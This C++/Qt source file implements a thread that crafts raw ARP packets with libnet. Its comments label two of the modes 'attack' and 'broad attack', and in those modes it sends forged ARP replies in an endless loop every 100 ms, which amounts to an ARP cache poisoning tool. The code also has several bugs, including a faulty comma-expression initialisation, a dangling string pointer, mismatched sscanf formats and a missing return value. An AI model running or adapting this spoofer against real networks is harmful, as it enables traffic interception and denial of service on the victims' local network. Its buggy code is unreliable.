#include "send_arppkt_thread.h"
#include <QDebug>
send_arppkt_thread::send_arppkt_thread(QObject *parent) : QThread(parent)
{

}

void send_arppkt_thread::getParam(char* dev,int op,unsigned char src_mac[6],char* src_ip_str,unsigned char dst_mac[6],
    char* dst_ip_str,unsigned char eth_dst_mac[6],unsigned char eth_src_mac[6])
{
    this->dev = dev;
    this->op = op;
    this->dst_ip_str = dst_ip_str;
    this->src_ip_str = src_ip_str;
    for(int i = 0; i < 6; i++)
    {
        this->src_mac[i] = src_mac[i];
        this->dst_mac[i] = dst_mac[i];
        this->eth_src_mac[i] = eth_src_mac[i];
        this->eth_dst_mac[i] = eth_dst_mac[i];
    }
    this->srcip = QString(src_ip_str);
    this->dstip = QString(dst_ip_str);
}

void send_arppkt_thread::run()
{
    send_pkt();
}
//op：b broadcast eth dstmac ffffffff arp dstmac 00000000
//   a attack eth头使用真实地址 arp使用假地址
//   c broad attack 广播 src地址假 dst为广播格式
int send_arppkt_thread::send_pkt()
{
    net_t = NULL;
    src_ip, dst_ip = 0;
    src_ip = libnet_name2addr4(net_t, src_ip_str, LIBNET_RESOLVE);//将字符串类型的ip转换为顺序网络字节流
    dst_ip = libnet_name2addr4(net_t, dst_ip_str, LIBNET_RESOLVE);
    net_t = libnet_init(LIBNET_LINK_ADV, dev, err_buf);//初始化发送包结构

    if(net_t == NULL)
    {
        fprintf(stderr, "libnet_init error/n");
        return -1;
    }
    switch (op) {
    case 'b':// dstmac = 0 0 0 0 0 0
        for(int i = 0; i < 6; i++)
        {
            dst_mac[i] = 0x00;
            eth_dst_mac[i] = 0xff;
        }
        flag = false;
        arpop = ARPOP_REQUEST;
        break;
    case 'a':
        arpop = ARPOP_REPLY;
        flag = true;
        break;
    case 'c':
        for(int i = 0; i < 6; i++)
        {
            dst_mac[i] = 0x00;
            eth_dst_mac[i] = 0xff;
        }
        arpop = ARPOP_REPLY;
        dst_ip = src_ip;
        flag = true;
    }
    p_tag = libnet_build_arp(
                ARPHRD_ETHER,//hardware type ethernet
                ETHERTYPE_IP,//protocol type
                6,//mac length
                4,//protocol length
                arpop,//op type
                (u_int8_t *)src_mac,//source mac addr这里的作用是更新目的地的arp表
                (u_int8_t *)&src_ip,//source ip addr
                (u_int8_t *)dst_mac,//dest mac addr
                (u_int8_t *)&dst_ip,//dest ip  addr
                NULL,//payload
                0,//payload length
                net_t,//libnet context
                0//0 stands to build a new one
     );//构造数据包arp头
    if(p_tag == -1)
    {
        fprintf(stderr, "libnet_build_arp error/n");
        return -1;
    }

    p_tag = libnet_build_ethernet(//create ethernet header
                    (u_int8_t *)eth_dst_mac,//dest mac addr
                    (u_int8_t *)eth_src_mac,//source mac addr
                    ETHERTYPE_ARP,//protocol type
                    NULL,//payload
                    0,//payload length
                    net_t,//libnet context
                    0//0 to build a new one
    );//构造数据包ethernet头
    if(p_tag == -1)
    {
        fprintf(stderr, "libnet_build_eth error/n");
        return -1;
    }
    do{

        int res = libnet_write(net_t);
        if(res == -1)
        {
            fprintf(stderr, "libnet_write error\n");
            return -1;
        }
        emit spkt(dst_mac,dstip,src_mac,srcip);
        msleep(100);
    }while(flag);
    libnet_destroy(net_t);
}

void send_arppkt_thread::Qs2uc(QString MAC, unsigned char* mac)
{
    char* qm = MAC.toLatin1().data();
    unsigned char s_mac[6]={0};
    sscanf(qm,"%02x:%02x:%02x:%02x:%02x:%02x",&s_mac[0],&s_mac[1],&s_mac[2],&s_mac[3],&s_mac[4],&s_mac[5]);
    for(int i = 0; i < 6; i++)
    {
        mac[i] = s_mac[i];
    }
}
